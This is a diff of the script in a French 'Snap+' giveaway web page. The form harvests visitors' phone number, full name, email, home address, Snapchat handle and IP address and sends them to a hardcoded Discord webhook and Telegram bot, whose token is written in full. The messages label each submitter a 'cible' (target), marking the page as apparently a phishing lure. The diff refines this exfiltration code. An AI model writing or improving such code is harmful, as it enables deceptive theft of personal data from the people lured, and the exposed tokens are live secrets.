@@ -125,111 +125,91 @@
     </div>
   </div>
 
-  <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+<script>
+  // Config Discord
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
 
-    // Ton token Telegram Bot et Chat ID Telegram (remplace par tes valeurs)
-    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
-    const TELEGRAM_CHAT_ID = "-1002810249796";
+  // Config Telegram
+  const TELEGRAM_BOT_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+  const TELEGRAM_CHAT_ID = "-1002810249796";
 
-    const SUBMISSION_LIMIT = 2;
-    const TIME_WINDOW_MINUTES = 30;
+  const SUBMISSION_LIMIT = 2;
+  const TIME_WINDOW_MINUTES = 30;
 
-    function showStep2() {
-      const phoneInput = document.querySelector('[name="telephone"]');
-      if (!phoneInput.value.trim()) {
-        alert("Veuillez entrer votre numéro de téléphone.");
-        return;
-      }
-      document.getElementById("step1").style.display = "none";
-      document.getElementById("step2").style.display = "block";
+  function showStep2() {
+    const phoneInput = document.querySelector('[name="telephone"]');
+    if (!phoneInput.value.trim()) {
+      alert("Veuillez entrer votre numéro de téléphone.");
+      return;
+    }
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+  }
+
+  async function getPublicIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip || "IP inconnue";
+    } catch {
+      return "IP inconnue";
+    }
+  }
+
+  function canSubmit() {
+    const now = Date.now();
+    const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
+    const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
+    if (recent.length >= SUBMISSION_LIMIT) return false;
+    recent.push(now);
+    localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
+    return true;
+  }
+
+  // Échappement MarkdownV2 pour Telegram
+  function escapeMarkdownV2(text) {
+    return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
+  }
+
+  async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const body = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "MarkdownV2",
+      disable_web_page_preview: true,
+    };
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body),
+    });
+    if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
+  }
+
+  document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    if (!canSubmit()) {
+      alert(`Vous avez dépassé la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
+      return;
     }
 
-    async function getPublicIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip || "IP inconnue";
-      } catch {
-        return "IP inconnue";
-      }
-    }
+    const data = new FormData(this);
+    const ip = await getPublicIP();
 
-    function canSubmit() {
-      const now = Date.now();
-      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
-      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
-      if (recent.length >= SUBMISSION_LIMIT) return false;
-      recent.push(now);
-      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
-      return true;
-    }
-
-    async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-      const payload = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "Markdown",
-        disable_web_page_preview: true
-      };
-
-      try {
-        const res = await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-        if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
-      } catch (err) {
-        console.error("Telegram error:", err);
-      }
-    }
-
-    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
-      e.preventDefault();
-
-      if (!canSubmit()) {
-        alert(`Vous avez dépassé la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
-        return;
-      }
-
-      const data = new FormData(this);
-      const ip = await getPublicIP();
-
-      // Discord embed
-      const embed = {
-        title: "🎁 Nouvelle cible Snap+ @everyone",
-        color: 0xA54FFB,
-        fields: [
-          { name: "📞 Téléphone", value: data.get("telephone") || "N/A", inline: true },
-          { name: "👤 Nom", value: data.get("nom") || "N/A", inline: true },
-          { name: "👤 Prénom", value: data.get("prenom") || "N/A", inline: true },
-          { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
-          { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
-          { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
-          { name: "🏠 Adresse", value: data.get("adresse") || "Non fournie", inline: false },
-          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
-          { name: "🌐 IP", value: ip, inline: false }
-        ],
-        footer: {
-          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`,
-        },
-        timestamp: new Date(),
-      };
-
-      // Telegram message (style encadré multi-parties)
-      const telegramMessage = `
-┌─🎁 *Nouvelle cible Snap+* @everyone
+    // Construction message Discord (texte brut, style cadre)
+    const discordMessage = `
+┌─🎁 Nouvelle cible Snap+ @everyone
 
 │ ┌─📞 Contact
-│ │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
-│ │ ├─ Email     : ${data.get("email") || "N/A"}
-│ │ └─ Snapchat  : ${data.get("snap") || "N/A"}
+│ │ ├─ Téléphone   : ${data.get("telephone") || "N/A"}
+│ │ ├─ Email       : ${data.get("email") || "N/A"}
+│ │ └─ Snapchat    : ${data.get("snap") || "N/A"}
 
 │ ├─👤 Identité
-│ │ ├─ Nom      : ${data.get("nom") || "N/A"}
-│ │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
+│ │ ├─ Nom        : ${data.get("nom") || "N/A"}
+│ │ ├─ Prénom     : ${data.get("prenom") || "N/A"}
 
 │ ├─📍 Localisation
 │ │ ├─ Ville        : ${data.get("ville") || "N/A"}
@@ -242,25 +222,50 @@
 └─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
 `;
 
+    // Construction message Telegram (MarkdownV2 avec échappement)
+    const telegramMessage = `
+┌─🎁 *Nouvelle cible Snap+* @everyone
+
+│ ┌─📞 Contact
+│ │ ├─ Téléphone   : ${escapeMarkdownV2(data.get("telephone") || "N/A")}
+│ │ ├─ Email       : ${escapeMarkdownV2(data.get("email") || "N/A")}
+│ │ └─ Snapchat    : ${escapeMarkdownV2(data.get("snap") || "N/A")}
+
+│ ├─👤 Identité
+│ │ ├─ Nom        : ${escapeMarkdownV2(data.get("nom") || "N/A")}
+│ │ ├─ Prénom     : ${escapeMarkdownV2(data.get("prenom") || "N/A")}
+
+│ ├─📍 Localisation
+│ │ ├─ Ville        : ${escapeMarkdownV2(data.get("ville") || "N/A")}
+│ │ ├─ Département  : ${escapeMarkdownV2(data.get("departement") || "N/A")}
+│ │ └─ Adresse      : ${escapeMarkdownV2(data.get("adresse") || "Non fournie")}
+
+│ └─🌐 Autres
+│   └─ IP          : ${escapeMarkdownV2(ip)}
+
+└─🕒 Reçu le : ${escapeMarkdownV2(new Date().toLocaleString("fr-FR"))}
+`;
+
+    try {
       // Envoi Discord
-      fetch(DISCORD_WEBHOOK_URL, {
+      await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
-      })
-      .then((res) => {
+        body: JSON.stringify({ content: discordMessage }),
+      }).then(res => {
         if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
-        // Envoi Telegram ensuite
-        return sendToTelegram(telegramMessage);
-      })
-      .then(() => {
-        window.location.href = "merci.html";
-      })
-      .catch((err) => {
-        alert("Erreur lors de l’envoi. Réessayez.");
-        console.error(err);
       });
-    });
-  </script>
+
+      // Envoi Telegram
+      await sendToTelegram(telegramMessage);
+
+      // Redirection
+      window.location.href = "merci.html";
+    } catch (err) {
+      alert("Erreur lors de l’envoi. Réessayez.");
+      console.error(err);
+    }
+  });
+</script>
 </body>
 </html>
